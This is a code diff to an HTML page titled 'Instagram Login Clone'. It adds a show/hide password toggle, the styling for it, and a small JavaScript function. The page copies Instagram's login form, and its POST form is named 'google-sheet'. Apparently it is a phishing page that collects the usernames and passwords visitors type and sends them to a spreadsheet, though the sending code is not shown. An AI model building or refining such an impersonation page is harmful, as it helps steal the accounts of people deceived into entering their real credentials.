@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Instagram Login </title>
+  <title>Instagram Login Clone</title>
   <style>
     * {
   box-sizing: border-box;
@@ -129,7 +129,39 @@ footer {
   color: gray;
 }
 
-    
+.password-container {
+  position: relative;
+  width: 100%;
+  margin: 4px 0;
+}
+
+.password-container input {
+  width: 100%;
+  height: 40px;
+  padding: 10px;
+  padding-right: 70px;
+  border: 1px solid #b3b3b3;
+  border-radius: 9px;
+  font-size: 1rem;
+  box-sizing: border-box;
+}
+
+.toggle-password {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  color: #000000;
+  font-weight: bold;
+  cursor: pointer;
+  font-size: 16px;
+  padding: 4px 6px;
+  line-height: 1.4;
+  white-space: nowrap;
+}
+
   </style>
 </head>
 <body>
@@ -143,8 +175,14 @@ footer {
     <div class="container">
       <form method="POST" name="google-sheet" id="loginForm">
         <input type="text" placeholder="Username, email or mobile number" id="username" name="username" />
-        <input type="text" placeholder="Password" id="password" name="password" autocomplete="new-password" />
-  
+      <!-- Inside the form, replace only this line: -->
+<!-- OLD: <input type="text" placeholder="Password" id="password" name="password" autocomplete="new-password" /> -->
+
+<div class="password-container">
+  <input type="password" placeholder="Password" id="password" name="password" autocomplete="new-password" />
+  <button type="button" class="toggle-password" onclick="togglePassword()">Show</button>
+</div>
+
         <button type="submit" class="login-btn" id="loginBtn" name="submit" disabled>
           Log in
           <div class="spinner" id="spinner"></div>
@@ -207,6 +245,20 @@ passwordInput.addEventListener('input', checkInputs);
           loginBtn.style.opacity = '1';
         });
     });
+
+    function togglePassword() {
+  const passwordInput = document.getElementById('password');
+  const toggleBtn = document.querySelector('.toggle-password');
+
+  if (passwordInput.type === 'password') {
+    passwordInput.type = 'text';
+    toggleBtn.textContent = 'Hide';
+  } else {
+    passwordInput.type = 'password';
+    toggleBtn.textContent = 'Show';
+  }
+}
+
   </script>
 </body>
 </html>
